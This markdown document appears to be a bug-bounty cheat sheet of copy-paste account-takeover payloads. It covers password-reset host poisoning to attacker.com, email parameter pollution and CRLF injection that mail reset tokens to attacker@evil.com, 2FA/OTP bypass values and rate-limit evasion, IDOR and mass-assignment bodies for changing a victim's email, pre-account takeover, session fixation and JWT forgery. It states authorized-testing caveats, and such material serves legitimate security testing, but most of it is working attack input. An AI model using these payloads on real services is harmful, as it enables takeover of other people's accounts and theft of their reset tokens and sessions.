# Account Takeover — Attack Arsenal (copy-paste)

**Author:** x8bitranjit
Reset / 2FA / email / session payloads and tricks for the guide. **Authorized targets only.** Prove with **two accounts you
own** (attacker `A`, victim `B`); every proof ends "as `A`, I'm inside `B`." Restore `B`'s state after. The finding is the
**takeover**, not the leaked token (Guide §15).

---

## 0. Setup

```
- Register TWO of your own accounts: A (attacker) + B (victim). Keep B's email/session under your control.
- Stand up a listener (your host) to catch poisoned reset links / Referer leaks.
- Map every flow first (Guide §1): login · register · reset · change-email/phone · 2FA/OTP · SSO · session/logout.
```

---

## 1. Password-reset poisoning — host / link control (Guide §2)

*What this does & when to use it:* forces the victim's reset **email** to point at **your** server, so their secret reset token lands with you when the link is followed (or server-fetched). Use it on the "forgot password" request — trigger the reset **for B**, add one of these headers/fields, and watch your listener for B's token. Each line is a different way to smuggle your host past validation (plain `Host`, the `X-Forwarded-*` variants, the `user@host` userinfo trick, CRLF dual-host); the `reset_url`/`callbackUrl` JSON fields are the easy version some APIs hand you. Try them one at a time.

```
# poison the host the reset link is built from (trigger the reset FOR B, catch B's token):
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Host: attacker.com&dummy=            # some parsers keep only the first token
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Scheme: http                          # pair with XFH to force scheme+host
Host: target.com:@attacker.com                    # userinfo trick
Host: attacker.com                                 (absolute-URI request line: GET https://target.com/... with a poisoned Host)
Host: target.com\r\n Host: attacker.com           # dual Host / CRLF
Referer: https://target.com/reset?...             # if the reset page loads YOUR resource, the token leaks in Referer
# body/JSON callback fields some APIs trust:
{"email":"victim@target.com","reset_url":"https://attacker.com/","callbackUrl":"https://attacker.com/","domain":"attacker.com"}
```

## 2. Reset-flow email parameter abuse (Guide §5)

*What this does & when to use it:* gets the victim's reset link **mailed to your inbox** by confusing which email address the server checks vs. which it sends to. Use it when §1's host tricks are blocked but the reset accepts an email you supply. The **HPP/array** lines send the address twice so the app validates B's but mails yours; the **CRLF** lines inject a second recipient (`cc`/`bcc`) via an encoded newline; the **normalization** line abuses an address that looks different to signup but resolves to B for delivery.

```
# HPP / array — validated as B, mailed to attacker:
email=victim@target.com&email=attacker@evil.com
email[]=victim@target.com&email[]=attacker@evil.com
{"email":["victim@target.com","attacker@evil.com"]}
{"email":"victim@target.com","email":"attacker@evil.com"}      # duplicate JSON key
# CRLF / second recipient:
email=victim@target.com%0acc:attacker@evil.com
email=victim@target.com%0d%0abcc:attacker@evil.com
email=victim@target.com,attacker@evil.com
email=victim@target.com%20attacker@evil.com
# email normalization / unicode collision (get B's reset via a "different" address):
Victim@target.com   victim@target.com.   victim+x@target.com   "victim"@target.com   vict?m@target.com (unicode look-alike)
```

## 3. Reset-token weakness checklist (Guide §4)

*What this does & when to use it:* checks whether the reset token can be **guessed, forged, or replayed** instead of intercepted. Run it when you can't poison delivery but you *can* generate tokens for your own account — collect a batch, look for a pattern (a token that ticks up or tracks the clock lets you compute B's), and test the lifecycle failures (works twice? survives a password change? not tied to your user?). The "not bound to user" line is the money test: pair *your* valid token with *B's* id/email.

```
□ collect N tokens for YOUR account (poc/reset_token_analyzer.py) -> sequential? timestamp? short? low-entropy? base64(userid+ts)?
□ token still valid after use? after a 2nd reset request? after email/password change? -> replay
□ token NOT bound to user -> submit MY token + B's id/email on the set-password step
□ token in the response JSON / redirect / Referer / logs
□ no rate-limit on token guess -> brute (../RaceCondition/ for parallel)
```

---

## 4. 2FA / OTP bypass (Guide §6–§8)

*What this does & when to use it:* defeats the second factor. Reach for these once you have (or are testing) the password step. **Structural bypass** = walk around the 2FA check entirely (force-browse past it, flip a client-trusted boolean, use a login path that never asks). **OTP value tricks** = malformed inputs a sloppy check may accept as correct. **Rate-limit bypass** = the tweaks that make brute-forcing the code possible (reset the counter, spoof a new client, race). Prove the missing limit on **your own** account with a bounded batch — never crack a real user's code.

```
# structural bypass:
- after the password step, force-browse straight to /dashboard or the authenticated API (skip the /2fa page)
- login response returns a usable session cookie BEFORE 2FA -> use it
- response manipulation:  {"2fa_required":true}->false   {"verified":false}->true   {"mfa":"pending"}->"approved"
- use the API / mobile / legacy / SSO login path that doesn't enforce 2FA
- disable 2FA endpoint without re-auth/OTP; recovery-code path weaker than TOTP
# OTP value tricks:
000000  0000  123456  111111  ""(empty)  null  true  otp[]=correct  {"otp":["1","2",...]}   # null/type-juggling/array
leading-zero / negative / very-long code ; the LAST OTP still valid ; the same OTP across users
# rate-limit bypass (make brute possible):
- re-request the OTP to reset the attempt counter
- new session/cookie per attempt ; rotate X-Forwarded-For / X-Real-IP ; add trailing space/case to the code
- parallel requests (race) before the limiter engages (../RaceCondition/)
# poc/otp_bruteforce.py detects a missing/resettable rate-limit on YOUR OWN account (bounded).
```

## 5. Email / phone change → ATO (Guide §9)

*What this does & when to use it:* repoints the victim's account identity (email/phone) at **you**, so recovery and OTP delivery come to your inbox/device. Use it wherever an account-detail change is under-protected — no password re-check, no verification of the new address, or (the big one) a **user id you can swap** so you change *B's* details from *A* (IDOR), or extra fields the update blindly accepts (mass assignment). Follow any success with a password reset to complete the takeover.

```
□ change email with NO current-password / NO OTP -> set B's email to mine, then reset
□ new email active BEFORE verification ; no confirmation to the OLD email
□ IDOR: POST /api/user/{B_id}/email  {"email":"me@evil.com"}   (change B's email as A) -> ../IDOR/
□ mass-assignment on profile update: {"email":"me@evil.com","email_verified":true,"is_admin":true,"phone":"+attacker"}
□ change B's phone/email so the OTP is delivered to ME (chains with 2FA)
```

## 6. Pre-account-takeover & registration (Guide §10)

*What this does & when to use it:* claims the victim's account **before they do** so their later login merges into yours. Use it on any site with SSO ("Sign in with Google") that doesn't strictly verify email ownership at signup — register B's email + your password now, wait for B's SSO login to fold into your account, and your password still works. The collision/overwrite lines are variants: register a normalized twin of an existing email, or an email the app links/overwrites instead of rejecting.

```
1) register with the VICTIM's email (verification not enforced / skippable): {"email":"victim@corp.com","email_verified":true}
2) victim later "Sign in with Google/SSO" -> app links/merges into MY pre-existing account (../OAuth/)
3) I still know my password -> shared access to the victim's account.
# collisions: register Victim@x.com when victim@x.com exists ; unicode/dot/whitespace normalization mismatch
# overwrite: registering an existing email links/overwrites instead of rejecting
```

## 7. Session / token (Guide §11)

*What this does & when to use it:* attacks the "logged-in wristband." Use these against the cookie/token lifecycle. **Fixation** = plant a session id in B's browser and hope login doesn't swap it (then your copy is authenticated). The **survives-logout/password-change** line is the force-multiplier — it makes any stolen session permanent. The rest cover forgeable "remember me" keys, tokens leaking via the URL, and JWTs you can forge outright (→ JWT kit).

```
□ SESSION FIXATION: set a known session id (cookie/URL) for B; B logs in; id NOT rotated -> shared authenticated session
□ session valid AFTER logout / password-change / email-change -> stolen session survives
□ "remember me" / trusted-device token: predictable, not device-bound, never expires -> forge/replay
□ session token in the URL -> leaks via Referer/logs
□ JWT: alg:none / weak HMAC secret / kid path / no exp -> forge B's token (../JWT/)
```

---

## 8. Tools

| Tool | Use |
|------|-----|
| **Burp** (Repeater/Intruder/Turbo Intruder) | Two-account flows, bounded OTP/rate-limit, host-header poisoning, HPP |
| **`poc/reset_token_analyzer.py`** | Score reset-token entropy / sequential / timestamp / reuse (own tokens) |
| **`poc/reset_poison_probe.py`** | Host/X-Forwarded-Host/Referer poisoning + email HPP/CRLF on the reset flow |
| **`poc/otp_bruteforce.py`** | Detect a missing/resettable OTP rate-limit on YOUR OWN account (bounded) |
| **Autorize / two-account diff** | IDOR-to-ATO on change-email/password endpoints |
| **your own listener / interactsh** | Catch poisoned reset links / Referer token leaks |

---

## 9. Triage rules (don't waste a report)

*How to read this:* left of the `->` is what you achieved; right is the verdict. The pattern to internalize is the **last** line — anything that stops before "logged in as B" is a *lead*, not a finding, so finish the takeover before you file. Everything above it is a completed cross-account takeover, hence the Critical/High.

```
poisoned host -> B's reset token caught at my server -> logged in as B          -> REPORT Critical (0-click ATO)
forgot-password API returns the token/link                                     -> REPORT Critical (unauth ATO, any email)
sequential/timestamp reset tokens -> forged B's token -> ATO                    -> REPORT Critical
OTP verify: 50 wrong codes on my own account, still accepted -> brute -> bypass -> REPORT High/Critical (2FA bypass)
email HPP (email=victim&email=attacker) -> B's token mailed to me -> ATO        -> REPORT Critical
IDOR on change-email (userId) -> changed B's email -> reset -> ATO              -> REPORT Critical
register B's unverified email -> B's SSO merges into my account                 -> REPORT High/Critical (pre-ATO)
"host reflected"/"no rate-limit"/"token in Referer" with NO takeover            -> NOT done; complete the ATO of B first
```

> Two own accounts. End every PoC "as A, I'm inside B." Benign marker (B's email on the profile). Restore B's state.
> Bounded OTP/token tests only — never mass-brute or touch a real user. Authorized targets only.
